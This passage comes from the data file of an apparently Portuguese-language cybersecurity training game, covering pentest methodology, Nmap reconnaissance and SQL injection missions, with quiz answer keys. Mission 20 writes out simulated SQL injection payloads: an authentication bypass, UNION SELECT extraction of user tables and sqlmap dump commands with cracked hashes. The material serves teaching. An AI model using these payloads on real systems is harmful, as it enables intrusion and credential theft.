      o_que_aconteceu: "Um reverse shell foi instalado via vetor desconhecido no servidor de pagamentos. O atacante acessou credenciais do banco de dados, potencialmente expondo dados de 47.000 clientes. A resposta correta evita danos adicionais e cumpre obrigações legais.",
      vulnerabilidade: "Ausência de EDR para detecção precoce, sem segmentação adequada de rede, credenciais em arquivo de configuração não criptografado.",
      risco: "Violação de dados financeiros e pessoais de 47.000 clientes, obrigações regulatórias (LGPD 72h, Banco Central), danos reputacionais e financeiros.",
      como_corrigir: "1. Desenvolver e treinar Plano de Resposta a Incidentes (IRP)\n2. Implementar SIEM + SOC 24/7\n3. EDR em todos os servidores\n4. Segmentação de rede (servidor de pagamentos isolado)\n5. Credenciais em vault (HashiCorp Vault, AWS Secrets Manager)\n6. Simular incidentes regularmente (tabletop exercises)",
      boa_pratica: "Framework NIST SP 800-61: Preparação → Detecção → Contenção → Erradicação → Recuperação → Lições Aprendidas. LGPD Art. 48: notificação obrigatória em 72h. Preservação forense ANTES de qualquer limpeza. Comunicação com stakeholders (jurídico, comunicação, C-level) desde o início."
    }
  },

  // ─── MISSÃO 18 ────────────────────────────────────────────────────────────
  {
    id: 18,
    titulo: "Metodologia de Pentest",
    subtitulo: "Dominando a metodologia profissional de testes de invasão",
    dificuldade: "Médio",
    tipo: "multipla_escolha",
    pontos_maximos: 150,
    icone: "📋",
    contexto: `<strong>Metodologia de Pentest Profissional</strong>
<br><br>
Um <strong>pentest (penetration test)</strong> é uma tentativa autorizada e controlada de comprometer sistemas
para identificar vulnerabilidades antes que atacantes reais o façam.
<br><br>
<strong>As 5 fases do pentest (PTES/OWASP):</strong><br>
<code>1. Reconhecimento</code> — coleta de informações (OSINT, DNS, WHOIS)<br>
<code>2. Varredura</code> — identificação de sistemas e serviços ativos<br>
<code>3. Enumeração</code> — identificação de vulnerabilidades específicas<br>
<code>4. Exploração</code> — tentativa controlada de explorar vulnerabilidades<br>
<code>5. Relatório</code> — documentação com evidências e recomendações<br>
<br>
<strong>CVSS — Common Vulnerability Scoring System:</strong><br>
• 0.0: Nenhum | 0.1–3.9: Baixo | 4.0–6.9: Médio | 7.0–8.9: Alto | 9.0–10.0: Crítico<br>
<br>
<strong>Responsible Disclosure (divulgação responsável):</strong><br>
Ao descobrir uma vulnerabilidade em sistema de terceiros sem autorização, o padrão ético é
notificar o responsável antes de publicar — prazo padrão da indústria: <strong>90 dias</strong>.`,
    dica: "Leia o briefing acima com atenção — as perguntas testam seu conhecimento sobre metodologia, CVSS e ética profissional.",
    perguntas: [
      {
        id: 1,
        texto: "Antes de iniciar qualquer pentest, qual documento é OBRIGATÓRIO para garantir que o trabalho é legal e protege tanto o pentester quanto o cliente?",
        opcoes: [
          { id: "a", texto: "Apenas um e-mail de autorização informal do cliente é suficiente" },
          { id: "b", texto: "Contrato formal com escopo detalhado (sistemas autorizados, janela de tempo, metodologia), NDA (non-disclosure agreement) e Regras de Engajamento (Rules of Engagement)" },
          { id: "c", texto: "Nenhum documento é necessário se o pentester for certificado" },
          { id: "d", texto: "Apenas o relatório final precisa ser documentado — o processo em si não" }
        ],
        correta: "b",
        pontos: 50,
        feedback_correto: "Correto! Sem contrato formal e escopo definido, o pentest é tecnicamente invasão de sistemas (crime pelo Art. 154-A do Código Penal). O escopo define exatamente o que pode ser testado — testar sistemas fora do escopo é ilegal mesmo com contrato.",
        feedback_errado: "E-mail informal não tem valor jurídico suficiente. O contrato formal com escopo preciso é o que separa pentest legal de invasão criminosa. Ele deve especificar: sistemas autorizados, janela de tempo, técnicas permitidas e responsabilidades."
      },
      {
        id: 2,
        texto: "Durante um pentest autorizado, você descobre uma vulnerabilidade com score CVSS 9.8 (Remote Code Execution sem autenticação). Qual ação imediata é esperada de um pentester profissional?",
        opcoes: [
          { id: "a", texto: "Explorar ao máximo para coletar o maior número de evidências possível antes de reportar" },
          { id: "b", texto: "Notificar o cliente imediatamente (out-of-band) mesmo que o pentest ainda esteja em andamento — vulnerabilidades críticas não podem aguardar o relatório final" },
          { id: "c", texto: "Ignorar e incluir apenas no relatório final — o cliente contratou o relatório completo" },
          { id: "d", texto: "Publicar a vulnerabilidade nas redes sociais para pressionar o cliente a corrigir" }
        ],
        correta: "b",
        pontos: 50,
        feedback_correto: "Correto! CVSS 9.8 = Crítico. Comunicação imediata é obrigação profissional: o cliente pode estar sob ataque ativo e cada hora importa. Boas práticas de pentest incluem escalada urgente para findings críticos — o relatório final vem depois, a notificação urgente vem primeiro.",
        feedback_errado: "Vulnerabilidades críticas exigem notificação imediata ao cliente — não é necessário esperar o relatório final. CVSS 9.8 significa impacto máximo: execução remota de código sem autenticação. O cliente precisa saber agora para poder tomar decisões de mitigação urgente."
      },
      {
        id: 3,
        texto: "Você encontrou uma vulnerabilidade grave em um site de banco que você NÃO foi contratado para testar. Qual é a conduta ética correta segundo o princípio de Responsible Disclosure?",
        opcoes: [
          { id: "a", texto: "Explorar a vulnerabilidade para provar que é real, depois notificar o banco" },
          { id: "b", texto: "Notificar o banco de forma privada e responsável, dar prazo de 90 dias para correção, e só publicar após o prazo — sem explorar, sem publicar antes do prazo" },
          { id: "c", texto: "Publicar imediatamente nas redes sociais para forçar correção rápida" },
          { id: "d", texto: "Ignorar completamente — não é problema seu se não foi contratado" }
        ],
        correta: "b",
        pontos: 50,
        feedback_correto: "Correto! Responsible Disclosure: notificação privada → prazo para correção (padrão: 90 dias) → publicação após correção ou expiração do prazo. Explorar sem autorização é crime (Art. 154-A) mesmo sendo para 'testar'. Programas de Bug Bounty existem exatamente para isso — permitem encontrar e reportar legalmente.",
        feedback_errado: "Explorar a vulnerabilidade sem autorização é crime independente das intenções. A conduta ética é: notificar o responsável de segurança do banco de forma privada, dar 90 dias para correção, e publicar apenas depois. Muitos bancos têm programas de bug bounty que permitem reporte legal e recompensas."
      }
    ],
    conclusao: {
      o_que_aconteceu: "A metodologia de pentest profissional é o que diferencia um ethical hacker de um criminoso: autorização formal, escopo definido, conduta ética em todas as fases, comunicação de findings críticos imediata, e relatório documentado com recomendações construtivas.",
      vulnerabilidade: "Pentests sem metodologia adequada são tanto ineficazes (não cobrem superfícies de ataque relevantes) quanto arriscados (falta de documentação expõe o pentester e o cliente legalmente).",
      risco: "Pentest mal conduzido pode: causar indisponibilidade de sistemas em produção, expor o pentester a processos criminais, gerar responsabilidade civil para o cliente, e deixar vulnerabilidades críticas sem serem encontradas.",
      como_corrigir: "Certificações relevantes: CEH (Certified Ethical Hacker), OSCP (Offensive Security Certified Professional), eJPT (eLearnSecurity Junior Penetration Tester — recomendado para iniciantes), CompTIA PenTest+.",
      boa_pratica: "Frameworks: PTES (Penetration Testing Execution Standard), OWASP Testing Guide, NIST SP 800-115. Ferramentas: Kali Linux, Metasploit (com autorização), Burp Suite, Nmap, Nikto. Regra fundamental: a autorização escrita é o que separa pentest de invasão — sem ela, é crime."
    }
  },

  // ─── MISSÃO 19 ────────────────────────────────────────────────────────────
  {
    id: 19,
    titulo: "Reconhecimento com Nmap",
    subtitulo: "Mapeamento ativo de superfície de ataque",
    dificuldade: "Médio",
    tipo: "terminal",
    pontos_maximos: 150,
    icone: "📡",
    contexto: `Você acaba de receber um contrato de pentest autorizado contra a <strong>TargetCorp S.A.</strong>
O escopo cobre o IP <code>192.168.10.50</code>. Fase 1: <strong>reconhecimento ativo</strong>.
Mapeie todos os serviços, versões e sistema operacional para montar o plano de ataque.`,
    dica: "Comece com <code>cat nmap_basic.txt</code> para ver a varredura inicial, depois <code>cat nmap_detailed.txt</code> e <code>cat nmap_vuln.txt</code>.",
    filesystem: {
      "/": ["home", "var"],
      "/home": ["hacker"],
      "/home/hacker": ["nmap_basic.txt", "nmap_detailed.txt", "nmap_vuln.txt", "nmap_os.txt", "http_banner.txt"],
      "/var": ["log"],
      "/var/log": ["pentest.log"],
    },
    files: {
      "/home/hacker/nmap_basic.txt": `# Comando: nmap -sS -p- 192.168.10.50
# Varredura SYN stealth — todas as 65535 portas
# Iniciada: 2024-02-12 09:14:32

Nmap scan report for 192.168.10.50 (targetcorp.local)
Host is up (0.0023s latency).
Not shown: 65527 closed tcp ports (reset)

PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
443/tcp   open  https
3306/tcp  open  mysql
8080/tcp  open  http-proxy
8443/tcp  open  https-alt
27017/tcp open  mongodb
6379/tcp  open  redis

Nmap done: 1 IP address (1 host up) scanned in 142.33 seconds`,

      "/home/hacker/nmap_detailed.txt": `# Comando: nmap -sV -sC -p 22,80,443,3306,8080,8443,27017,6379 192.168.10.50
# Detectando versões e rodando scripts padrão NSE

PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.5
| ssh-hostkey:
|   2048 8e:2e:3e:f3:d4:c9:11:aa:bb:cc:dd:ee:ff:00:11:22 (RSA)
|_  256 aa:bb:cc:dd:ee:ff:00:11:22:33:44:55:66:77:88:99 (ECDSA)

80/tcp    open  http        Apache httpd 2.4.49
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: TargetCorp - Employee Portal
|_http-server-header: Apache/2.4.49 (Ubuntu)

443/tcp   open  ssl/http    Apache httpd 2.4.49
|_ssl-cert: Subject: commonName=targetcorp.local

3306/tcp  open  mysql       MySQL 5.7.35-log
| mysql-info:
|   Version: 5.7.35-log
|_  Status: Autocommit

8080/tcp  open  http        Werkzeug httpd 2.0.1 (Python 3.8.10)
|_http-title: TargetCorp Admin Panel

27017/tcp open  mongodb     MongoDB 4.4.6
| mongodb-info:
|_  MongoDB -- sem autenticacao configurada!

6379/tcp  open  redis       Redis key-value store 6.0.9
|_redis-info: Redis sem autenticacao -- acesso livre!

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel`,

      "/home/hacker/nmap_vuln.txt": `# Comando: nmap --script=vuln -p 80,443 192.168.10.50
# Testando vulnerabilidades conhecidas

PORT   STATE SERVICE
80/tcp open  http
| http-vuln-cve2021-41773:
|   VULNERABLE:
|   Apache HTTP Server 2.4.49 Path Traversal e RCE
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE: CVE-2021-41773
|     Risk factor: Critical -- CVSS: 9.8
|     Description:
|       Falha na normalizacao de URLs permite path traversal fora do DocumentRoot.
|       Se mod_cgi estiver ativo: Remote Code Execution completo.
|       Explorado ativamente in-the-wild desde outubro de 2021.
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41773

443/tcp open  https
|_http-vuln-cve2021-41773: VULNERABLE (mesma versao no HTTPS)`,

      "/home/hacker/nmap_os.txt": `# Comando: nmap -O --osscan-guess 192.168.10.50

OS detection performed:
Running: Linux 4.X|5.X
OS details: Linux 4.15 - 5.6
Network Distance: 1 hop

Kernel 4.15 identificado -- possiveis CVEs:
- CVE-2021-3156 (Sudo Baron Samedit -- sudo < 1.9.5p2)
- CVE-2021-4034 (Polkit pkexec -- local privilege escalation)
- CVE-2022-0847 (Dirty Pipe -- kernel < 5.16.11)`,

      "/home/hacker/http_banner.txt": `# Comando: curl -I http://192.168.10.50

HTTP/1.1 200 OK
Server: Apache/2.4.49 (Ubuntu)
X-Powered-By: PHP/7.4.3
Set-Cookie: PHPSESSID=abc123; path=/; HttpOnly

# HEADERS DE SEGURANÇA AUSENTES:
# - Content-Security-Policy: NAO configurado
# - X-Content-Type-Options: NAO configurado
# - Strict-Transport-Security: NAO configurado
# - Server header expoe versao exata do Apache`,

      "/var/log/pentest.log": `[2024-02-12 09:14:00] Pentest iniciado -- TargetCorp S.A.
[2024-02-12 09:14:32] Autorizacao verificada -- escopo: 192.168.10.50
[2024-02-12 09:15:00] Iniciando fase de reconhecimento ativo`,
    },
    perguntas: [
      {
        id: 1,
        texto: "O nmap_basic.txt mostra portas 27017 (MongoDB) e 6379 (Redis) abertas. O nmap_detailed.txt confirma: ambos SEM autenticação. O que isso representa?",
        opcoes: [
          { id: "a", texto: "MongoDB e Redis são serviços normais — sem risco adicional de estarem expostos" },
          { id: "b", texto: "Bancos de dados nunca devem ser expostos à internet; sem autenticação significa acesso total a todos os dados sem credenciais — CVSS 10.0" },
          { id: "c", texto: "Precisamos fazer login para confirmar se há risco real" },
          { id: "d", texto: "Apenas o MySQL (3306) representa risco real neste cenário" }
        ],
        correta: "b",
        pontos: 40,
        feedback_correto: "Perfeito! MongoDB na 27017 e Redis na 6379 jamais devem estar expostos à internet. Sem autenticação = qualquer pessoa acessa, lê, modifica e deleta todos os dados sem nenhuma credencial. CVSS 10.0. O nmap_detailed.txt confirma explicitamente 'sem autenticação configurada' em ambos — vulnerabilidade imediatamente explorável.",
        feedback_errado: "Bancos de dados (MongoDB, Redis, MySQL) nunca devem ficar expostos diretamente à internet. O nmap_detailed.txt confirma o pior cenário: MongoDB e Redis completamente sem autenticação. Isso significa acesso total aos dados por qualquer pessoa na internet — CVSS 10.0. É o tipo de misconfiguration que expõe milhões de registros de usuários."
      },
      {
        id: 2,
        texto: "O nmap_vuln.txt identifica CVE-2021-41773 no Apache 2.4.49 como EXPLOITABLE (CVSS 9.8). O que este CVE permite fazer?",
        opcoes: [
          { id: "a", texto: "Apenas ler código-fonte de arquivos PHP — sem execução de código" },
          { id: "b", texto: "Path Traversal para ler arquivos fora do webroot E Remote Code Execution se mod_cgi estiver ativo — comprometimento total do servidor" },
          { id: "c", texto: "Derrubar o servidor Apache com um pacote malformado (DoS apenas)" },
          { id: "d", texto: "Injeção SQL no banco de dados via requisição HTTP" }
        ],
        correta: "b",
        pontos: 40,
        feedback_correto: "CVE-2021-41773: (1) Path Traversal — leitura de qualquer arquivo no servidor via URL manipulada (ex: /etc/passwd, chaves SSH, configs com senhas), (2) com mod_cgi ativo: RCE completo — executar qualquer comando como o usuário do Apache. Foi explorado massivamente in-the-wild em outubro de 2021, dias após o disclosure.",
        feedback_errado: "CVE-2021-41773 é mais severo do que parece: Path Traversal permite ler /etc/passwd, chaves SSH privadas, arquivos de configuração com senhas de banco. E se mod_cgi estiver ativo (comum em servidores legados): Remote Code Execution completo — o atacante executa qualquer comando no servidor como www-data."
      },
      {
        id: 3,
        texto: "Para detectar versões de serviço E executar scripts de vulnerabilidade conhecidos, o comando nmap completo é:",
        opcoes: [
          { id: "a", texto: "nmap -sS 192.168.10.50" },
          { id: "b", texto: "nmap -p 80 192.168.10.50" },
          { id: "c", texto: "nmap -sV -sC --script=vuln -p- 192.168.10.50" },
          { id: "d", texto: "nmap --fast 192.168.10.50" }
        ],
        correta: "c",
        pontos: 30,
        feedback_correto: "Exato! -sV detecta versões dos serviços (revela Apache 2.4.49, Redis 6.0.9, etc.), -sC roda os scripts NSE padrão, --script=vuln adiciona verificações de CVEs conhecidos (como o CVE-2021-41773 encontrado), -p- varre todas as 65535 portas e não apenas as 1000 mais comuns. Combinação padrão em reconhecimento de pentest profissional.",
        feedback_errado: "nmap -sV -sC --script=vuln -p- é o comando completo de reconhecimento: -sV detecta versões (essencial para identificar CVEs), -sC roda scripts padrão NSE (banners, certificados, métodos HTTP), --script=vuln testa CVEs conhecidos automaticamente, -p- varre todas as portas (sem -p- só varreria as 1000 mais comuns e perderia portas como 27017 e 6379)."
      },
      {
        id: 4,
        texto: "Com base no reconhecimento completo, qual é o PRIMEIRO vetor de exploração recomendado e por quê?",
        opcoes: [
          { id: "a", texto: "Testar credenciais padrão no SSH (porta 22)" },
          { id: "b", texto: "CVE-2021-41773 no Apache 2.4.49 — CVSS 9.8, confirmado como exploitable, exploit público disponível, RCE direto no servidor" },
          { id: "c", texto: "Conectar diretamente ao MongoDB sem autenticação" },
          { id: "d", texto: "Brute force no MySQL (porta 3306)" }
        ],
        correta: "b",
        pontos: 40,
        feedback_correto: "Priorização correta de red team! CVE-2021-41773: CVSS 9.8, exploit público bem documentado, confirmado pelo Nmap como exploitable nesta versão específica, e resulta em RCE — controle shell do servidor. Com o servidor comprometido, acessamos MongoDB e Redis internamente (sem passar pela rede pública). Estratégia: exploit mais confiável e com maior impacto primeiro.",
        feedback_errado: "CVE-2021-41773 é o vetor prioritário: (1) CVSS 9.8 — quase máximo, (2) exploit público e amplamente disponível, (3) Nmap confirmou como exploitable, (4) RCE = shell no servidor, de onde acessamos MongoDB e Redis internamente. MongoDB sem auth também é crítico, mas CVE-2021-41773 nos dá controle do host inteiro — pivotamos para os bancos de dados de dentro."
      }
    ],
    conclusao: {
      o_que_aconteceu: "O reconhecimento ativo com Nmap revelou uma superfície de ataque crítica: Apache 2.4.49 vulnerável a RCE (CVE-2021-41773, CVSS 9.8), MongoDB e Redis sem autenticação expostos à internet, MySQL acessível externamente, e ausência completa de headers de segurança HTTP.",
      vulnerabilidade: "Múltiplas vulnerabilidades críticas identificadas: CVE-2021-41773 (Apache RCE), bancos de dados sem autenticação expostos publicamente, versões desatualizadas de software sem patches, e serviços internos acessíveis diretamente da internet.",
      risco: "Comprometimento total do servidor via RCE, exfiltração de dados via MongoDB e Redis sem autenticação, e pivoting para rede interna a partir do servidor comprometido.",
      como_corrigir: "1. Atualizar Apache imediatamente para 2.4.51+ (patch do CVE-2021-41773)\n2. Configurar firewall: bancos de dados NUNCA expostos à internet — bind em 127.0.0.1\n3. Habilitar autenticação em MongoDB e Redis\n4. Implementar headers de segurança HTTP (CSP, HSTS, X-Content-Type-Options)\n5. Segmentar rede: serviços internos em VLAN separada sem acesso externo direto",
      boa_pratica: "Reconhecimento é a fase mais crítica do pentest — uma varredura completa com nmap -sV -sC --script=vuln -p- revela a superfície de ataque real. No dia a dia: mantenha inventário de ativos atualizado (asset inventory), use Shodan para ver o que está exposto na internet sem saber, e aplique patches em no máximo 7 dias para CVEs críticos (CVSS >= 9.0). CVEs explorados in-the-wild exigem patching em 24-48h."
    }
  },

  // ─── MISSÃO 20 ────────────────────────────────────────────────────────────
  {
    id: 20,
    titulo: "SQLi na Prática — Extração de Dados",
    subtitulo: "SQL Injection manual e automatizado com sqlmap",
    dificuldade: "Difícil",
    tipo: "terminal",
    pontos_maximos: 200,
    icone: "💉",
    contexto: `O reconhecimento identificou um portal web vulnerável em <code>http://192.168.10.50/portal.php?id=1</code>.
Testes iniciais mostram mensagens de erro do banco de dados expostas na tela.
Sua missão: <strong>executar SQL Injection manualmente e com sqlmap para extrair credenciais</strong> — de forma documentada e dentro do escopo contratado.`,
    dica: "Leia <code>cat teste_manual.txt</code> para os primeiros testes, depois <code>cat union_test.txt</code> e <code>cat sqlmap_dump.txt</code>.",
    filesystem: {
      "/": ["home", "var"],
      "/home": ["hacker"],
      "/home/hacker": ["teste_manual.txt", "union_test.txt", "sqlmap_output.txt", "sqlmap_dump.txt", "relatorio_parcial.txt"],
      "/var": ["log"],
      "/var/log": ["pentest.log"],
    },
    files: {
      "/home/hacker/teste_manual.txt": `# Teste Manual de SQL Injection
# Target: http://192.168.10.50/portal.php?id=

=== TESTE 1: Valor normal ===
curl "http://192.168.10.50/portal.php?id=1"
-> Retorna: <h2>Bem-vindo, Carlos!</h2>

=== TESTE 2: Aspas simples (deteccao) ===
curl "http://192.168.10.50/portal.php?id=1'"
-> ERRO EXPOSTO:
   You have an error in your SQL syntax; check the manual
   that corresponds to your MySQL server version for the right
   syntax to use near ''' at line 1

*** CONFIRMADO: SQL INJECTION! ***
Input nao sanitizado -- concatenado diretamente na query SQL.

=== TESTE 3: Bypass de autenticacao no login ===
curl "http://192.168.10.50/login.php" \\
  --data "user=' OR '1'='1' --&pass=qualquer"
-> Login bem-sucedido como: admin (id=1)

A query virou:
  SELECT * FROM users WHERE user='' OR '1'='1' --' AND pass='qualquer'
  A condicao OR '1'='1' e sempre verdadeira -> bypassa autenticacao.

=== TESTE 4: Enumerar numero de colunas (ORDER BY) ===
id=1 ORDER BY 1--  -> OK
id=1 ORDER BY 2--  -> OK
id=1 ORDER BY 3--  -> OK
id=1 ORDER BY 4--  -> OK
id=1 ORDER BY 5--  -> ERRO
-> Resultado: a query original retorna exatamente 4 colunas.`,

      "/home/hacker/union_test.txt": `# Extracao manual via UNION SELECT
# Target: http://192.168.10.50/portal.php?id=

=== PASSO 1: Identificar coluna visivel na resposta ===
Payload: id=0 UNION SELECT 1,2,3,4--
-> Pagina exibe: "Bem-vindo, 2!"
-> Coluna 2 e exibida no HTML -- usaremos para exfiltrar dados.

=== PASSO 2: Versao do banco ===
Payload: id=0 UNION SELECT 1,version(),3,4--
-> Resultado: 5.7.35-log  (MySQL 5.7.35 confirmado)

=== PASSO 3: Banco de dados atual ===
Payload: id=0 UNION SELECT 1,database(),3,4--
-> Resultado: targetcorp_db

=== PASSO 4: Listar tabelas ===
Payload: id=0 UNION SELECT 1,group_concat(table_name),3,4
         FROM information_schema.tables
         WHERE table_schema='targetcorp_db'--
-> Resultado: users,employees,sessions,products,orders

=== PASSO 5: Colunas da tabela users ===
Payload: id=0 UNION SELECT 1,group_concat(column_name),3,4
         FROM information_schema.columns
         WHERE table_name='users'--
-> Resultado: id,username,password,email,role

=== PASSO 6: DUMP da tabela users ===
Payload: id=0 UNION SELECT 1,
         group_concat(username,':',password SEPARATOR '|'),3,4
         FROM users--
-> Resultado:
   admin:5f4dcc3b5aa765d61d8327deb882cf99
   carlos:e10adc3949ba59abbe56e057f20f883e
   suporte:d8578edf8458ce06fbc5bb76a58c5ca4`,

      "/home/hacker/sqlmap_output.txt": `# Comando: sqlmap -u "http://192.168.10.50/portal.php?id=1" --dbs --batch

[INFO] testing connection to the target URL
[INFO] GET parameter 'id' appears to be dynamic
[INFO] heuristic test shows parameter 'id' might be injectable
[INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[INFO] GET parameter 'id' appears to be 'boolean-based blind' injectable
[INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
[INFO] parameter 'id' appears to be 'time-based blind' injectable
[INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[INFO] parameter 'id' is 'Generic UNION query (NULL) - 4 columns' injectable

sqlmap identified injection points:
Parameter: id (GET)
    Type: boolean-based blind
    Payload: id=1 AND 2908=2908

    Type: time-based blind
    Payload: id=1 AND SLEEP(5)

    Type: UNION query (4 columns)
    Payload: id=0 UNION ALL SELECT NULL,CONCAT(dados),NULL,NULL--

back-end DBMS: MySQL >= 5.0.12
web server: Apache 2.4.49 / PHP 7.4.3

available databases [3]:
[*] information_schema
[*] mysql
[*] targetcorp_db`,

      "/home/hacker/sqlmap_dump.txt": `# Comando: sqlmap -u "http://192.168.10.50/portal.php?id=1"
#          -D targetcorp_db -T users --dump --batch

[INFO] fetching columns for table 'users'
[INFO] fetching entries for table 'users'
[INFO] recognized possible password hashes in column 'password'
[INFO] using hash method 'md5_generic_passwd'
[INFO] loading dictionary from wordlist...

+----+----------+----------------------------------+----------------------+-------+
| id | username | password                         | email                | role  |
+----+----------+----------------------------------+----------------------+-------+
| 1  | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 | admin@targetcorp.com | admin |
|    |          | -> CRACKEADO: password           |                      |       |
+----+----------+----------------------------------+----------------------+-------+
| 2  | carlos   | e10adc3949ba59abbe56e057f20f883e | carlos@targetcorp.com| user  |
|    |          | -> CRACKEADO: 123456             |                      |       |
+----+----------+----------------------------------+----------------------+-------+
| 3  | suporte  | d8578edf8458ce06fbc5bb76a58c5ca4 | suporte@targetcorp.com|admin |
|    |          | -> CRACKEADO: qwerty             |                      |       |
+----+----------+----------------------------------+----------------------+-------+

[INFO] table 'targetcorp_db.users' dumped to CSV`,

      "/home/hacker/relatorio_parcial.txt": `# Relatorio Parcial -- SQL Injection
# TargetCorp S.A. | Pentest Autorizado

ACHADO CRITICO -- SQL Injection (CVSS 9.8)
==========================================
Parametro vulneravel: GET id em /portal.php
Tipos de SQLi confirmados:
  - Boolean-based blind
  - Time-based blind
  - UNION-based (usado para extracao)

Dados Extraidos:
  Database: targetcorp_db
  Tabela users: 3 registros incluindo 2 admins
  Senhas: MD5 sem salt -> TODAS crackeadas instantaneamente

Impacto:
  -> Acesso administrativo completo (admin/password)
  -> Comprometimento de contas admin e suporte
  -> MD5 sem salt: rainbow tables crackeiam em segundos

Recomendacoes Imediatas:
  1. Prepared Statements / PDO (elimina SQLi por design)
  2. Trocar TODAS as senhas comprometidas
  3. Migrar de MD5 para bcrypt/Argon2id
  4. WAF temporario ate correcao do codigo-fonte`,
    },
    perguntas: [
      {
        id: 1,
        texto: "O teste_manual.txt mostra que inserir uma aspas simples (') retornou um erro SQL do servidor. O que isso PROVA e qual é o próximo passo?",
        opcoes: [
          { id: "a", texto: "Prova que o servidor está mal configurado, mas não é diretamente explorável" },
          { id: "b", texto: "Prova que o input do usuário é concatenado diretamente na query SQL sem sanitização — SQL Injection confirmado. Próximo: payloads UNION SELECT para extração de dados" },
          { id: "c", texto: "É apenas um erro de validação de formulário — o banco permanece seguro" },
          { id: "d", texto: "Precisamos de credenciais para explorar a vulnerabilidade" }
        ],
        correta: "b",
        pontos: 50,
        feedback_correto: "Diagnóstico perfeito! O erro SQL exposto confirma dois problemas: (1) input não sanitizado — a aspas foi para dentro da query quebrando a sintaxe SQL, (2) error disclosure — o servidor retorna mensagens de erro internas, facilitando o fingerprinting. Próximo: UNION SELECT para extrair dados do banco sem autenticação.",
        feedback_errado: "Aspas simples retornando erro SQL é o indicador clássico de SQL Injection. Significa que o PHP está fazendo: 'SELECT * FROM users WHERE id='.$_GET['id']' — a aspas do atacante quebra a sintaxe, o banco retorna erro interno visível na página. É exploração direta via UNION SELECT para ler qualquer tabela do banco."
      },
      {
        id: 2,
        texto: "O union_test.txt usa ORDER BY crescente para enumerar colunas antes do UNION SELECT. Por que essa etapa é obrigatória?",
        opcoes: [
          { id: "a", texto: "ORDER BY melhora a velocidade da extração de dados" },
          { id: "b", texto: "UNION SELECT exige que ambas as queries retornem exatamente o mesmo número de colunas — ORDER BY N causa erro quando N supera o total real de colunas, revelando esse número" },
          { id: "c", texto: "ORDER BY é necessário apenas em MySQL — outros bancos não precisam" },
          { id: "d", texto: "Para que os resultados apareçam em ordem alfabética no HTML" }
        ],
        correta: "b",
        pontos: 50,
        feedback_correto: "Técnica fundamental! UNION em SQL exige: mesmo número de colunas e tipos compatíveis nas duas queries. ORDER BY 1 até N causa erro quando N > número real de colunas. No exemplo: ORDER BY 4 funciona, ORDER BY 5 falha → query original tem 4 colunas. Então UNION SELECT 1,payload,3,4-- funciona e a coluna 2 (visível na página) carrega os dados extraídos.",
        feedback_errado: "UNION SELECT requer que as duas queries tenham o mesmo número de colunas. Para descobrir esse número, usamos ORDER BY N — aumentando N até gerar erro. Quando ORDER BY 5 falha mas ORDER BY 4 funciona, a query original tem 4 colunas. Então: UNION SELECT 1,version(),3,4-- funciona. Sem saber o número exato de colunas, o UNION retorna erro SQL."
      },
      {
        id: 3,
        texto: "O sqlmap_dump.txt mostra senhas em MD5 sem salt TODAS crackeadas. Por que MD5 é inadequado para armazenar senhas?",
        opcoes: [
          { id: "a", texto: "MD5 é lento demais para verificar senhas em tempo real" },
          { id: "b", texto: "MD5 é rápido demais (GPUs fazem bilhões de hashes/segundo), sem salt permite rainbow tables pré-computadas, e hashes idênticos revelam usuários com a mesma senha" },
          { id: "c", texto: "MD5 não é compatível com todos os bancos de dados modernos" },
          { id: "d", texto: "MD5 ocupa muito espaço em disco" }
        ],
        correta: "b",
        pontos: 50,
        feedback_correto: "Análise perfeita! MD5 tem três falhas fatais para senhas: (1) Velocidade — GPUs fazem 10+ bilhões de hashes MD5 por segundo, tornando brute force trivial, (2) Sem salt — 'password' sempre vira '5f4dcc3b...' em qualquer banco, rainbow tables pré-computadas crackeiam instantaneamente, (3) sqlmap até crackeou as senhas automaticamente durante o dump! Use bcrypt (fator de custo configurável) ou Argon2id.",
        feedback_errado: "MD5 é inadequado por: (1) Extremamente rápido — bilhões de tentativas por segundo em GPU, (2) Sem salt — mesmo hash para mesma senha em qualquer banco = rainbow tables funcionam, (3) Sem iterações — bcrypt e Argon2 são propositalmente lentos, cada tentativa leva 100ms em vez de nanosegundos. Use sempre bcrypt (PHP), bcryptjs (Node.js), passlib (Python) para hash de senhas."
      },
      {
        id: 4,
        texto: "Você tem dump completo do banco com credenciais admin. Qual é a conduta ética correta agora em um pentest profissional?",
        opcoes: [
          { id: "a", texto: "Usar admin/password para acessar todos os sistemas e demonstrar o impacto máximo" },
          { id: "b", texto: "Parar a exploração, documentar com evidências mínimas, notificar imediatamente o cliente da criticidade e aguardar autorização para continuar" },
          { id: "c", texto: "Deletar dados para provar que o dano real seria possível" },
          { id: "d", texto: "Compartilhar as credenciais com a equipe por e-mail como evidência" }
        ],
        correta: "b",
        pontos: 50,
        feedback_correto: "Conduta ética exemplar! Pentest profissional (PTES): (1) evidências mínimas — screenshot do dump prova o achado sem exfiltrar dados reais de usuários, (2) parar quando o objetivo foi provado — não explora além do necessário, (3) notificar imediatamente findings críticos — não acumula para o relatório final, (4) nunca usa credenciais além do escopo mínimo de prova. Objetivo: provar a vulnerabilidade, não maximizar o dano.",
        feedback_errado: "Conduta ética em pentest: (1) DOCUMENTAR — screenshot do dump como evidência mínima, (2) PARAR — objective proved, não continua explorando além do necessário, (3) NOTIFICAR — cliente precisa saber imediatamente de comprometimento de credenciais admin, (4) NÃO EXFILTRAR dados reais de usuários — viola LGPD e o contrato, (5) NUNCA deletar ou modificar dados — pode causar dano irreversível."
      }
    ],
    conclusao: {
      o_que_aconteceu: "SQL Injection UNION-based no parâmetro ?id= permitiu extrair o banco de dados completo sem autenticação. Senhas em MD5 sem salt foram crackeadas em segundos via rainbow tables, comprometendo as contas admin e suporte com acesso privilegiado ao sistema.",
      vulnerabilidade: "CWE-89 (SQL Injection) — concatenação direta de input do usuário em queries SQL sem sanitização. Agravante: senhas em MD5 sem salt (CWE-916) permitiram crackear 100% das credenciais instantaneamente via rainbow tables.",
